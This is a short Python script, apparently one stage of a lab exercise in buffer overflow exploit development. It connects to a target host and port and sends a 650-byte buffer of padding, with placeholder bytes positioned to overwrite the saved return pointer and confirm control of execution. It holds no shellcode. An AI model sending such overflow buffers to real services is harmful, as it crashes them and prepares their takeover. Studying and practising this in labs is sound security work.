#!/usr/bin/env python3
# stage 4 verify the offset
import socket,sys

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

# handle connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# setup payload 
offset = 146
total_buff_size = 650

buff = ""
payload = "\x41" * (offset - len(buff))                   # lead padding
eip = "\x42" * 4                                          # saved return pointer overwrite 
esp = "\x43" * 4                                          # where esp should be pointing
postfix = "\n"              
trail_padding = "\x44" * (total_buff_size - len(buff) - len(payload) - len(eip) - len(esp) - len(postfix))


# handle payload
buff += payload + eip + esp + trail_padding + postfix 

# payload status
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff)))
s.sendall(buff.encode('utf-8'))
s.close()
